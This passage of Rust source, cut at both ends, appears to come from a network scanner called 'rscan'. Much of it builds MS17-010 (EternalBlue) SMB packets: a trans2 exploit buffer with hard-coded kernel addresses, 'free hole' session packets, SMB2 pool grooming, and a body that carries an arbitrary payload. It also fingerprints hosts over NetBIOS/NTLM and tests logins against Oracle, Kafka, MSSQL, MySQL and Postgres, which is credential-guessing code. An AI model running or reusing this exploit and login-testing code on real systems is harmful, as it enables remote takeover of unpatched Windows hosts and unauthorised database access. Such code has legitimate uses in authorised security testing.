    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0, 0x00, 0x00]);
    packet.extend_from_slice(&[0x00; 8]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&tree_id);
    packet.extend_from_slice(&[0xFF, 0xFE]);
    packet.extend_from_slice(&user_id);
    packet.extend_from_slice(&[0x40, 0x00]);
    packet.push(0x14);
    packet.extend_from_slice(&[0x01, 0x00, 0x00]);
    packet.extend_from_slice(&[0x1E, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0xD0, 0x03, 0x01, 0x00]);
    packet.extend_from_slice(&[0x1E, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0x1E, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0x4B, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0xD0, 0x03, 0x00, 0x00]);
    packet.extend_from_slice(&[0x68, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0x01, 0x00, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0xEC, 0x03]);
    packet.extend(std::iter::repeat_n(0u8, 0x1F));
    packet.push(0x01);
    packet.extend(std::iter::repeat_n(0u8, 0x03CD));
    packet
}

fn smb1_trans2_exploit_packet(
    tree_id: [u8; 2],
    user_id: [u8; 2],
    timeout: usize,
    kind: &str,
) -> Vec<u8> {
    let mut packet = Vec::new();
    let timeout = timeout * 0x10 + 3;

    packet.extend_from_slice(&[0x00, 0x00, 0x10, 0x35]);
    packet.extend_from_slice(b"\xFFSMB");
    packet.push(0x33);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0, 0x00, 0x00]);
    packet.extend_from_slice(&[0x00; 8]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&tree_id);
    packet.extend_from_slice(&[0xFF, 0xFE]);
    packet.extend_from_slice(&user_id);
    packet.extend_from_slice(&[0x40, 0x00]);
    packet.push(0x09);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x10]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x10]);
    packet.extend_from_slice(&[0x35, 0x00, 0xD0, timeout as u8]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x10]);

    match kind {
        "exploit" => {
            packet.extend(std::iter::repeat_n(0x41, 2957));
            packet.extend_from_slice(&[0x80, 0x00, 0xA8, 0x00]);
            packet.extend(std::iter::repeat_n(0u8, 0x10));
            packet.extend_from_slice(&[0xFF, 0xFF]);
            packet.extend(std::iter::repeat_n(0u8, 0x06));
            packet.extend_from_slice(&[0xFF, 0xFF]);
            packet.extend(std::iter::repeat_n(0u8, 0x16));
            packet.extend_from_slice(&[0x00, 0xF1, 0xDF, 0xFF]);
            packet.extend(std::iter::repeat_n(0u8, 0x08));
            packet.extend_from_slice(&[0x20, 0xF0, 0xDF, 0xFF]);
            packet.extend_from_slice(&[0x00, 0xF1, 0xDF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            packet.extend_from_slice(&[0x60, 0x00, 0x04, 0x10]);
            packet.extend(std::iter::repeat_n(0u8, 0x04));
            packet.extend_from_slice(&[0x80, 0xEF, 0xDF, 0xFF]);
            packet.extend(std::iter::repeat_n(0u8, 0x04));
            packet.extend_from_slice(&[0x10, 0x00, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            packet.extend_from_slice(&[0x18, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            packet.extend(std::iter::repeat_n(0u8, 0x10));
            packet.extend_from_slice(&[0x60, 0x00, 0x04, 0x10]);
            packet.extend(std::iter::repeat_n(0u8, 0x0C));
            packet.extend_from_slice(&[0x90, 0xFF, 0xCF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            packet.extend(std::iter::repeat_n(0u8, 0x08));
            packet.extend_from_slice(&[0x80, 0x10]);
            packet.extend(std::iter::repeat_n(0u8, 0x0E));
            packet.extend_from_slice(&[0x39, 0xBB]);
            packet.extend(std::iter::repeat_n(0x41, 965));
        }
        "zero" => {
            packet.extend(std::iter::repeat_n(0u8, 2055));
            packet.extend_from_slice(&[0x83, 0xF3]);
            packet.extend(std::iter::repeat_n(0x41, 2039));
        }
        _ => packet.extend(std::iter::repeat_n(0x41, 4096)),
    }

    packet
}

fn smb1_echo_packet(tree_id: [u8; 2], user_id: [u8; 2]) -> Vec<u8> {
    let mut packet = Vec::new();
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x31]);
    packet.extend_from_slice(b"\xFFSMB");
    packet.push(0x2B);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0, 0x00, 0x00]);
    packet.extend_from_slice(&[0x00; 8]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&tree_id);
    packet.extend_from_slice(&[0xFF, 0xFE]);
    packet.extend_from_slice(&user_id);
    packet.extend_from_slice(&[0x40, 0x00]);
    packet.extend_from_slice(&[0x01, 0x01, 0x00, 0x0C, 0x00]);
    packet.extend_from_slice(b"AAAAAAAAAAA\0");
    packet
}

fn smb1_free_hole(target: &OpenService, timeout: Duration, start: bool) -> Result<TcpStream> {
    let mut stream = connect_stream(target, timeout)?;
    write_and_flush(&mut stream, &ms17010_negotiate_request())?;
    let _ = read_ms17010_response(&mut stream, "free hole negotiate")?;

    write_and_flush(&mut stream, &smb1_free_hole_session_packet(start))?;
    let _ = read_smb1_packet(&mut stream, "free hole session")?;
    Ok(stream)
}

fn smb1_free_hole_session_packet(start: bool) -> Vec<u8> {
    let (flags2, vc_num, native_os) = if start {
        (
            [0x07, 0xC0],
            [0x2D, 0x01],
            vec![0xF0, 0xFF, 0x00, 0x00, 0x00],
        )
    } else {
        (
            [0x07, 0x40],
            [0x2C, 0x01],
            vec![0xF8, 0x87, 0x00, 0x00, 0x00],
        )
    };

    let mut packet = Vec::new();
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x51]);
    packet.extend_from_slice(b"\xFFSMB");
    packet.push(0x73);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x18]);
    packet.extend_from_slice(&flags2);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x00; 8]);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0x00, 0x00, 0x40, 0x00]);
    packet.push(0x0C);
    packet.extend_from_slice(&[0xFF, 0x00, 0x00, 0x00, 0x04, 0x11, 0x0A, 0x00]);
    packet.extend_from_slice(&vc_num);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x80]);
    packet.extend_from_slice(&[0x16, 0x00]);
    packet.extend_from_slice(&native_os);
    packet.extend(std::iter::repeat_n(0u8, 17));
    packet
}

fn smb2_grooms(target: &OpenService, timeout: Duration, count: usize) -> Result<Vec<TcpStream>> {
    let mut streams = Vec::with_capacity(count);
    for _ in 0..count {
        let mut stream = connect_stream(target, timeout)?;
        write_and_flush(&mut stream, MS17010_SMB2_GROOM_HEADER)?;
        streams.push(stream);
    }
    Ok(streams)
}

fn smb2_body(payload: &[u8]) -> Vec<u8> {
    let packet_max_payload = MS17010_PACKET_MAX_LEN - MS17010_PACKET_SETUP_LEN;
    let mut body = Vec::new();
    body.extend(std::iter::repeat_n(0u8, 0x08));
    body.extend_from_slice(&[0x03, 0x00, 0x00, 0x00]);
    body.extend(std::iter::repeat_n(0u8, 0x1C));
    body.extend_from_slice(&[0x03, 0x00, 0x00, 0x00]);
    body.extend(std::iter::repeat_n(0u8, 0x74));
    body.extend_from_slice(&[0xB0, 0x00, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
    body.extend_from_slice(&[0xB0, 0x00, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
    body.extend(std::iter::repeat_n(0u8, 0x10));
    body.extend_from_slice(&[0xC0, 0xF0, 0xDF, 0xFF]);
    body.extend_from_slice(&[0xC0, 0xF0, 0xDF, 0xFF]);
    body.extend(std::iter::repeat_n(0u8, 0xC4));
    body.extend_from_slice(&[0x90, 0xF1, 0xDF, 0xFF]);
    body.extend(std::iter::repeat_n(0u8, 0x04));
    body.extend_from_slice(&[0xF0, 0xF1, 0xDF, 0xFF]);
    body.extend(std::iter::repeat_n(0u8, 0x40));
    body.extend_from_slice(&[0xF0, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
    body.extend(std::iter::repeat_n(0u8, 0x08));
    body.extend_from_slice(&[0x00, 0x02, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
    body.push(0x00);
    body.extend_from_slice(payload);
    body.extend(std::iter::repeat_n(
        0u8,
        packet_max_payload.saturating_sub(payload.len()),
    ));
    body
}

fn oracle_login(
    target: &OpenService,
    username: &str,
    password: &str,
    service_name: &str,
    timeout_secs: u64,
    as_sysdba: bool,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .context("failed to build oracle runtime")?;

    runtime.block_on(async {
        let mut config =
            OracleConfig::new(&target.host, target.port, service_name, username, password)
                .connect_timeout(timeout);
        if as_sysdba {
            config = config.with_sysdba();
        }
        match tokio::time::timeout(timeout, OracleConnection::connect_with_config(config)).await {
            Ok(Ok(connection)) => {
                let _ = tokio::time::timeout(timeout, connection.close()).await;
                Ok(true)
            }
            Ok(Err(_)) | Err(_) => Ok(false),
        }
    })
}

fn read_ms17010_response(stream: &mut TcpStream, stage: &str) -> Result<Vec<u8>> {
    let mut response = vec![0u8; 4096];
    let size = stream
        .read(&mut response)
        .with_context(|| format!("failed to read {stage} response"))?;
    if size < 36 {
        anyhow::bail!("{stage} response too short");
    }
    response.truncate(size);
    Ok(response)
}

fn read_smb1_packet(stream: &mut TcpStream, stage: &str) -> Result<Vec<u8>> {
    let mut netbios = [0u8; 4];
    stream
        .read_exact(&mut netbios)
        .with_context(|| format!("failed to read {stage} netbios header"))?;
    if netbios[0] != 0x00 {
        anyhow::bail!("invalid {stage} netbios message type: 0x{:02x}", netbios[0]);
    }
    let length =
        ((netbios[1] as usize) << 16) | ((netbios[2] as usize) << 8) | (netbios[3] as usize);
    let mut body = vec![0u8; length];
    stream
        .read_exact(&mut body)
        .with_context(|| format!("failed to read {stage} smb body"))?;
    let mut packet = Vec::with_capacity(4 + body.len());
    packet.extend_from_slice(&netbios);
    packet.extend_from_slice(&body);
    Ok(packet)
}

fn smb_status_code(response: &[u8]) -> Result<u32> {
    let bytes: [u8; 4] = response
        .get(9..13)
        .context("missing smb status code")?
        .try_into()
        .context("invalid smb status code length")?;
    Ok(u32::from_le_bytes(bytes))
}

fn smb_user_id(response: &[u8]) -> Result<[u8; 2]> {
    response
        .get(32..34)
        .context("missing smb user id")?
        .try_into()
        .context("invalid smb user id length")
}

fn smb_tree_id(response: &[u8]) -> Result<[u8; 2]> {
    response
        .get(28..30)
        .context("missing smb tree id")?
        .try_into()
        .context("invalid smb tree id length")
}

fn parse_ms17010_os(response: &[u8]) -> String {
    let Some(session) = response.get(36..) else {
        return String::new();
    };
    if session.first().copied().unwrap_or_default() == 0 || session.len() < 10 {
        return String::new();
    }
    let byte_count = u16::from_le_bytes([session[7], session[8]]) as usize;
    if response.len() != byte_count + 45 {
        return String::new();
    }
    let end = session[10..]
        .windows(2)
        .position(|window| window == [0, 0])
        .map(|index| index + 10)
        .unwrap_or(session.len());
    let bytes = session[10..end]
        .iter()
        .copied()
        .filter(|byte| *byte != 0)
        .collect::<Vec<_>>();
    String::from_utf8_lossy(&bytes).trim().to_string()
}

fn ms17010_negotiate_request() -> Vec<u8> {
    hex::decode(MS17010_NEGOTIATE_REQUEST_HEX).expect("valid MS17010 negotiate request")
}

fn ms17010_session_setup_request() -> Vec<u8> {
    hex::decode(MS17010_SESSION_SETUP_REQUEST_HEX).expect("valid MS17010 session setup request")
}

fn ms17010_tree_connect_request(host: &str, user_id: [u8; 2]) -> Vec<u8> {
    let ipc_path = format!(r"\\{}\IPC$", host);
    let byte_count = 1 + ipc_path.len() + 1 + 6;
    let mut packet = Vec::new();
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(b"\xFFSMB");
    packet.push(0x75);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 0x00, 0x00]);
    packet.extend_from_slice(&[0x00; 8]);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x2F, 0x4B]);
    packet.extend_from_slice(&user_id);
    packet.extend_from_slice(&[0xC5, 0x5E]);
    packet.extend_from_slice(&[0x04, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00]);
    packet.extend_from_slice(&(byte_count as u16).to_le_bytes());
    packet.push(0x00);
    packet.extend_from_slice(ipc_path.as_bytes());
    packet.push(0x00);
    packet.extend_from_slice(b"?????\0");
    let length = (packet.len() - 4) as u32;
    packet[1..4].copy_from_slice(&length.to_be_bytes()[1..4]);
    packet
}

fn ms17010_trans_named_pipe_request() -> Vec<u8> {
    hex::decode(MS17010_TRANS_NAMED_PIPE_REQUEST_HEX)
        .expect("valid MS17010 trans named pipe request")
}

fn ms17010_trans2_session_setup_request() -> Vec<u8> {
    hex::decode(MS17010_TRANS2_SESSION_SETUP_REQUEST_HEX)
        .expect("valid MS17010 trans2 session setup request")
}

fn parse_findnet_payload(payload: &[u8]) -> Option<(String, Vec<String>, Vec<String>)> {
    let marker = payload
        .windows(FINDNET_END_MARKER.len())
        .position(|window| window == FINDNET_END_MARKER)?;
    let relevant = &payload[..marker.saturating_sub(4)];
    let encoded = hex::encode(relevant);

    let hostname_hex = encoded
        .as_bytes()
        .chunks(4)
        .take_while(|chunk| *chunk != b"0000")
        .flat_map(|chunk| chunk.iter().copied())
        .collect::<Vec<_>>();
    let hostname = decode_utf16le_hex(std::str::from_utf8(&hostname_hex).ok()?)
        .filter(|value| is_valid_findnet_hostname(value))
        .unwrap_or_default();

    let mut ipv4 = Vec::new();
    let mut ipv6 = Vec::new();
    let mut seen = BTreeSet::new();
    for segment in encoded.replace("0700", "").split("000000") {
        if segment.is_empty() {
            continue;
        }
        let normalized = if segment.len() % 2 == 0 {
            segment.to_string()
        } else {
            format!("{segment}0")
        };
        let bytes = match hex::decode(&normalized) {
            Ok(bytes) => bytes,
            Err(_) => continue,
        };
        let candidate = clean_findnet_address(&bytes);
        if candidate.is_empty() || !seen.insert(candidate.clone()) {
            continue;
        }
        if candidate.contains(':') {
            ipv6.push(candidate);
        } else if candidate.parse::<std::net::Ipv4Addr>().is_ok() {
            ipv4.push(candidate);
        }
    }

    if hostname.is_empty() && ipv4.is_empty() && ipv6.is_empty() {
        None
    } else {
        Some((hostname, ipv4, ipv6))
    }
}

fn decode_utf16le_hex(value: &str) -> Option<String> {
    let mut padded = value.to_string();
    while padded.len() % 4 != 0 {
        padded.push('0');
    }
    let mut output = String::new();
    for chunk in padded.as_bytes().chunks(4) {
        let text = std::str::from_utf8(chunk).ok()?;
        let swapped = format!("{}{}", &text[2..4], &text[0..2]);
        let code = u16::from_str_radix(&swapped, 16).ok()?;
        if let Some(ch) = char::from_u32(code as u32).filter(|ch| !ch.is_control()) {
            output.push(ch);
        }
    }
    Some(output)
}

fn is_valid_findnet_hostname(value: &str) -> bool {
    if value.is_empty() || value.len() > 255 {
        return false;
    }
    let bytes = value.as_bytes();
    bytes
        .first()
        .is_some_and(|byte| byte.is_ascii_alphanumeric())
        && bytes
            .last()
            .is_some_and(|byte| byte.is_ascii_alphanumeric())
        && bytes
            .iter()
            .all(|byte| byte.is_ascii_alphanumeric() || *byte == b'-')
}

fn clean_findnet_address(value: &[u8]) -> String {
    let candidate = String::from_utf8_lossy(value)
        .chars()
        .filter(|ch| !ch.is_control())
        .collect::<String>()
        .trim()
        .to_string();
    if candidate.parse::<std::net::IpAddr>().is_ok() || is_valid_findnet_hostname(&candidate) {
        candidate
    } else {
        String::new()
    }
}

fn parse_netbios_udp_response(input: &[u8]) -> Option<NetBiosInfo> {
    if input.len() < 57 {
        return None;
    }
    let count = *input.get(56)? as usize;
    let data = &input[57..];
    let mut info = NetBiosInfo::default();

    for index in 0..count {
        let start = 18 * index;
        let entry = data.get(start..start + 18)?;
        let name = String::from_utf8_lossy(&entry[..15]).trim().to_string();
        let suffix = entry[15];
        let group = entry[16] >= 128;
        match (suffix, group) {
            (0x00, true) => {
                if info.domain_name.is_empty() {
                    info.domain_name = name.clone();
                    info.group_name = name;
                }
            }
            (0x00, false) => {
                if info.workstation_service.is_empty() {
                    info.workstation_service = name;
                }
            }
            (0x20, _) => {
                if info.server_service.is_empty() {
                    info.server_service = name;
                }
            }
            (0x1c, _) => {
                if info.domain_controllers.is_empty() {
                    info.domain_controllers = name;
                }
            }
            (0x1b, _) => {
                if info.domain_name.is_empty() {
                    info.domain_name = name;
                }
            }
            _ => {}
        }
    }

    if info == NetBiosInfo::default() {
        None
    } else {
        Some(info)
    }
}

fn netbios_session_request(name: &str) -> Vec<u8> {
    let mut payload = Vec::new();
    payload.extend_from_slice(b"\x81\x00\x00D ");
    payload.extend_from_slice(&netbios_encode_name(name));
    payload.extend_from_slice(NETBIOS_SESSION_REQUEST_SUFFIX);
    payload
}

fn netbios_encode_name(name: &str) -> Vec<u8> {
    format!("{name:<16}")
        .bytes()
        .flat_map(|byte| [((byte >> 4) & 0x0f) + b'A', (byte & 0x0f) + b'A'])
        .collect()
}

fn parse_netbios_ntlm_response(input: &[u8]) -> Option<NetBiosInfo> {
    if input.len() < 48 {
        return None;
    }

    let target_info_length = u16::from_le_bytes([*input.get(43)?, *input.get(44)?]) as usize;
    if input.len() < 47 + target_info_length {
        return None;
    }
    let os_bytes = &input[47 + target_info_length..];
    let os_text = String::from_utf8_lossy(
        &os_bytes
            .iter()
            .copied()
            .filter(|byte| *byte != 0)
            .collect::<Vec<_>>(),
    )
    .trim_end_matches('|')
    .to_string();

    let start = input.windows(7).position(|window| window == b"NTLMSSP")?;
    if input.len() < start + 45 {
        return None;
    }
    let length = u16::from_le_bytes([input[start + 40], input[start + 41]]) as usize;
    let offset = input[start + 44] as usize;
    if input.len() < start + offset + length {
        return None;
    }

    let mut info = NetBiosInfo {
        os_version: os_text,
        ..NetBiosInfo::default()
    };
    let mut index = start + offset;
    let end = start + offset + length;
    while index + 4 <= end && index + 4 <= input.len() {
        let item_type = &input[index..index + 2];
        let item_len = u16::from_le_bytes([input[index + 2], input[index + 3]]) as usize;
        index += 4;
        if item_type == b"\x00\x00" || index + item_len > input.len() {
            break;
        }
        let content = String::from_utf8_lossy(
            &input[index..index + item_len]
                .iter()
                .copied()
                .filter(|byte| *byte != 0)
                .collect::<Vec<_>>(),
        )
        .to_string();
        match item_type {
            b"\x01\x00" => info.netbios_computer = content,
            b"\x02\x00" => info.netbios_domain = content,
            b"\x03\x00" => info.computer_name = content,
            b"\x04\x00" => info.domain_name = content,
            _ => {}
        }
        index += item_len;
    }

    if info == NetBiosInfo::default() {
        None
    } else {
        Some(info)
    }
}

fn join_netbios(base: &mut NetBiosInfo, extra: &NetBiosInfo) {
    if !extra.computer_name.is_empty() {
        base.computer_name = extra.computer_name.clone();
    }
    if !extra.netbios_domain.is_empty() {
        base.netbios_domain = extra.netbios_domain.clone();
    }
    if !extra.netbios_computer.is_empty() {
        base.netbios_computer = extra.netbios_computer.clone();
    }
    if !extra.domain_name.is_empty() {
        base.domain_name = extra.domain_name.clone();
    }
    if !extra.os_version.is_empty() {
        base.os_version = extra.os_version.clone();
    }
}

fn kafka_login(
    target: &OpenService,
    username: Option<&str>,
    password: Option<&str>,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;

    if let (Some(username), Some(password)) = (username, password) {
        write_and_flush(&mut stream, &kafka_sasl_handshake_request(1, "PLAIN"))?;
        let handshake = match kafka_read_frame(&mut stream) {
            Ok(frame) => frame,
            Err(_) => return Ok(false),
        };
        if kafka_response_correlation(&handshake) != Some(1)
            || kafka_sasl_handshake_error(&handshake).unwrap_or(i16::MAX) != 0
        {
            return Ok(false);
        }

        write_and_flush(
            &mut stream,
            &kafka_sasl_plain_auth_frame(username, password),
        )?;
        write_and_flush(&mut stream, &kafka_api_versions_request(2))?;
        let response = match kafka_read_frame(&mut stream) {
            Ok(frame) => frame,
            Err(_) => return Ok(false),
        };
        Ok(kafka_response_correlation(&response) == Some(2))
    } else {
        write_and_flush(&mut stream, &kafka_api_versions_request(1))?;
        let response = match kafka_read_frame(&mut stream) {
            Ok(frame) => frame,
            Err(_) => return Ok(false),
        };
        Ok(kafka_response_correlation(&response) == Some(1))
    }
}

fn mssql_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;

    mssql_write_packet(&mut stream, 0x12, 1, &mssql_prelogin_message())?;
    let _ = mssql_read_message(&mut stream)?;

    mssql_write_packet(
        &mut stream,
        0x10,
        1,
        &mssql_login7_message(&target.host, username, password),
    )?;
    let response = mssql_read_message(&mut stream)?;
    Ok(mssql_login_succeeded(&response))
}

fn mysql_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;

    let handshake = mysql_read_packet(&mut stream)?;
    let scramble = mysql_extract_scramble(&handshake)?;
    let response = mysql_handshake_response(username, password, &scramble);
    mysql_write_packet(&mut stream, 1, &response)?;

    let reply = mysql_read_packet(&mut stream)?;
    Ok(reply.first().copied() == Some(0x00))
}

fn postgres_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;
    write_and_flush(&mut stream, &postgres_startup_message(username, "postgres"))?;

    let mut authenticated = false;
    loop {
        match postgres_read_message(&mut stream) {
            Ok((b'R', payload)) => match postgres_auth_code(&payload)? {
                0 => authenticated = true,
                3 => write_and_flush(&mut stream, &postgres_password_message(password))?,
                5 => {
                    let salt = payload.get(4..8).context("missing postgres md5 salt")?;
                    write_and_flush(
                        &mut stream,
                        &postgres_password_message(&postgres_md5_password(
                            username, password, salt,
                        )),
                    )?;
                }
                _ => return Ok(false),
            },
            Ok((b'Z', _)) => return Ok(authenticated),
            Ok((b'E', _)) => return Ok(false),
            Ok(_) => {}
            Err(error)
                if authenticated
                    && error
                        .root_cause()
                        .downcast_ref::<std::io::Error>()
                        .is_some_and(|io| {
                            matches!(
                                io.kind(),
                                ErrorKind::UnexpectedEof
                                    | ErrorKind::ConnectionReset
                                    | ErrorKind::TimedOut
                                    | ErrorKind::WouldBlock
                            )
                        }) =>
            {
                return Ok(true);
            }
            Err(error) => return Err(error),
        }
    }
}

fn mssql_prelogin_message() -> Vec<u8> {
    const VERSION: u8 = 0x00;
    const ENCRYPTION: u8 = 0x01;
    const THREAD_ID: u8 = 0x03;
    const MARS: u8 = 0x04;
    const TERMINATOR: u8 = 0xFF;

    let fields = [
        (VERSION, 6u16),
        (ENCRYPTION, 1u16),
        (THREAD_ID, 4u16),
        (MARS, 1u16),
    ];
    let mut payload = Vec::with_capacity(64);
    let mut offset = (fields.len() * 5 + 1) as u16;
    for (token, length) in fields {
        payload.push(token);
        payload.extend_from_slice(&offset.to_be_bytes());
        payload.extend_from_slice(&length.to_be_bytes());
        offset += length;
    }
    payload.push(TERMINATOR);
    payload.extend_from_slice(&0u32.to_be_bytes());
    payload.extend_from_slice(&0u16.to_be_bytes());
    payload.push(0x00);
    payload.extend_from_slice(&0u32.to_be_bytes());
    payload.push(0x00);
    payload
}

fn mssql_login7_message(server_name: &str, username: &str, password: &str) -> Vec<u8> {
    const LOGIN7_HEADER_SIZE: usize = 94;

    let hostname = "rscan";
    let app_name = "rscan";
    let library_name = "rscan";

    let hostname_utf16 = utf16le_bytes(hostname);
    let username_utf16 = utf16le_bytes(username);
    let password_utf16 = mssql_obfuscate_password(password);
    let app_name_utf16 = utf16le_bytes(app_name);
    let server_name_utf16 = utf16le_bytes(server_name);
    let library_name_utf16 = utf16le_bytes(library_name);

    let hostname_len = (hostname_utf16.len() / 2) as u16;
    let username_len = (username_utf16.len() / 2) as u16;
    let password_len = (password_utf16.len() / 2) as u16;
    let app_name_len = (app_name_utf16.len() / 2) as u16;
    let server_name_len = (server_name_utf16.len() / 2) as u16;
    let library_name_len = (library_name_utf16.len() / 2) as u16;

    let mut variable = Vec::with_capacity(256);
    let mut offset = LOGIN7_HEADER_SIZE as u16;

    let hostname_offset = offset;
    variable.extend_from_slice(&hostname_utf16);
    offset += hostname_utf16.len() as u16;

    let username_offset = offset;
    variable.extend_from_slice(&username_utf16);
    offset += username_utf16.len() as u16;

    let password_offset = offset;
    variable.extend_from_slice(&password_utf16);
    offset += password_utf16.len() as u16;

    let app_name_offset = offset;
    variable.extend_from_slice(&app_name_utf16);
    offset += app_name_utf16.len() as u16;

    let server_name_offset = offset;
    variable.extend_from_slice(&server_name_utf16);
    offset += server_name_utf16.len() as u16;

    let unused_offset = offset;

    let library_name_offset = offset;
    variable.extend_from_slice(&library_name_utf16);
    offset += library_name_utf16.len() as u16;

    let language_offset = offset;
    let database_offset = offset;
    let sspi_offset = offset;
    let attach_db_offset = offset;
    let new_password_offset = offset;

    let total_length = LOGIN7_HEADER_SIZE + variable.len();
    let mut payload = Vec::with_capacity(total_length);
    payload.extend_from_slice(&(total_length as u32).to_le_bytes());
    payload.extend_from_slice(&0x74000004u32.to_le_bytes());
    payload.extend_from_slice(&4096u32.to_le_bytes());
    payload.extend_from_slice(&0u32.to_le_bytes());
    payload.extend_from_slice(&0u32.to_le_bytes());
    payload.extend_from_slice(&0u32.to_le_bytes());
    payload.push(0x60);
    payload.push(0x03);
    payload.push(0x00);
    payload.push(0x08);
    payload.extend_from_slice(&0i32.to_le_bytes());
    payload.extend_from_slice(&0x0409u32.to_le_bytes());
    payload.extend_from_slice(&hostname_offset.to_le_bytes());
    payload.extend_from_slice(&hostname_len.to_le_bytes());
    payload.extend_from_slice(&username_offset.to_le_bytes());
    payload.extend_from_slice(&username_len.to_le_bytes());
    payload.extend_from_slice(&password_offset.to_le_bytes());
    payload.extend_from_slice(&password_len.to_le_bytes());
    payload.extend_from_slice(&app_name_offset.to_le_bytes());
    payload.extend_from_slice(&app_name_len.to_le_bytes());
    payload.extend_from_slice(&server_name_offset.to_le_bytes());
    payload.extend_from_slice(&server_name_len.to_le_bytes());
    payload.extend_from_slice(&unused_offset.to_le_bytes());
    payload.extend_from_slice(&0u16.to_le_bytes());
    payload.extend_from_slice(&library_name_offset.to_le_bytes());
    payload.extend_from_slice(&library_name_len.to_le_bytes());
    payload.extend_from_slice(&language_offset.to_le_bytes());
    payload.extend_from_slice(&0u16.to_le_bytes());
    payload.extend_from_slice(&database_offset.to_le_bytes());
    payload.extend_from_slice(&0u16.to_le_bytes());
    payload.extend_from_slice(&[0u8; 6]);
    payload.extend_from_slice(&sspi_offset.to_le_bytes());
    payload.extend_from_slice(&0u16.to_le_bytes());
    payload.extend_from_slice(&attach_db_offset.to_le_bytes());
    payload.extend_from_slice(&0u16.to_le_bytes());
    payload.extend_from_slice(&new_password_offset.to_le_bytes());
    payload.extend_from_slice(&0u16.to_le_bytes());
    payload.extend_from_slice(&0u32.to_le_bytes());
    payload.extend_from_slice(&variable);
    payload
}

fn mssql_obfuscate_password(password: &str) -> Vec<u8> {
    let mut encoded = Vec::with_capacity(password.len() * 2);
    for code_unit in password.encode_utf16() {
        let low = (code_unit & 0xFF) as u8;
        let high = (code_unit >> 8) as u8;
        encoded.push(low.rotate_right(4) ^ 0xA5);
        encoded.push(high.rotate_right(4) ^ 0xA5);
    }
    encoded
}

fn mssql_write_packet(
    stream: &mut TcpStream,
    packet_type: u8,
    packet_id: u8,
    payload: &[u8],
) -> Result<()> {
    let length = (payload.len() + 8) as u16;
    let mut packet = Vec::with_capacity(payload.len() + 8);
    packet.push(packet_type);
    packet.push(0x01);
    packet.extend_from_slice(&length.to_be_bytes());
    packet.extend_from_slice(&[0x00, 0x00, packet_id, 0x00]);
    packet.extend_from_slice(payload);
    write_and_flush(stream, &packet)
}

fn mssql_read_message(stream: &mut TcpStream) -> Result<Vec<u8>> {
    let mut message = Vec::new();
    loop {
        let mut header = [0u8; 8];
        stream
            .read_exact(&mut header)
            .context("failed to read mssql packet header")?;
        let length = u16::from_be_bytes([header[2], header[3]]) as usize;
        if length < 8 {
            anyhow::bail!("invalid mssql packet length");
        }
        let mut payload = vec![0u8; length - 8];
        stream
            .read_exact(&mut payload)
            .context("failed to read mssql packet payload")?;
        message.extend_from_slice(&payload);
        if header[1] & 0x01 != 0 {
            break;
        }
    }
    Ok(message)
}

fn mssql_login_succeeded(payload: &[u8]) -> bool {
    let mut index = 0usize;
    let mut login_ack = false;
    while index < payload.len() {
        match payload[index] {
            0xAD => {
                if let Some(length) = payload
